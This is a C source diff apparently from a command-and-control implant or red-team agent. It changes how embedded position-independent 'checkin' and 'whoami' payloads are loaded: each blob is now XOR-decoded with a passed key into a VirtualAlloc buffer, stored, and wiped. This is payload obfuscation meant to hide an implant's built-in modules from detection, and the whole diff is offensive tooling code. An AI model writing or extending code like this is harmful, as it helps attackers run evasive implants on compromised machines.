@@ -30,18 +30,24 @@ char * find_whoami_pico() {
     return (char *)&__WHOAMI_PICO__;
 }
 
-BuiltinPicos load_builtin_picos(DataVault *vault) {
+BuiltinPicos load_builtin_picos(DataVault *vault, char *key) {
 	BuiltinPicos picos = { 0 };
 
 	picos.checkin = "_builtin_checkin";
 	_EMBEDDED_PICO *checkin = (_EMBEDDED_PICO *) find_checkin_pico();
-	add_to_vault(vault, picos.checkin, checkin->value, checkin->length);
-	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }	
+	char *raw_checkin = KERNEL32$VirtualAlloc(0, checkin->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	xorify(raw_checkin, checkin->value, checkin->length, key, XORKEY_LEN);
+	add_to_vault(vault, picos.checkin, raw_checkin, checkin->length);
+	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
+	KERNEL32$VirtualFree(raw_checkin, 0, MEM_RELEASE);
 	
 	picos.whoami = "_builtin_whoami";
 	_EMBEDDED_PICO *whoami = (_EMBEDDED_PICO *) find_whoami_pico();
-	add_to_vault(vault, picos.whoami, whoami->value, whoami->length);
+	char *raw_whoami = KERNEL32$VirtualAlloc(0, whoami->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	xorify(raw_whoami, whoami->value, whoami->length, key, XORKEY_LEN);
+	add_to_vault(vault, picos.whoami, raw_whoami, whoami->length);
 	for (int i = 0; i < whoami->length; i++) { whoami->value[i] = 0; }
+	KERNEL32$VirtualFree(raw_whoami, 0, MEM_RELEASE);
 	
 	return picos;
 }
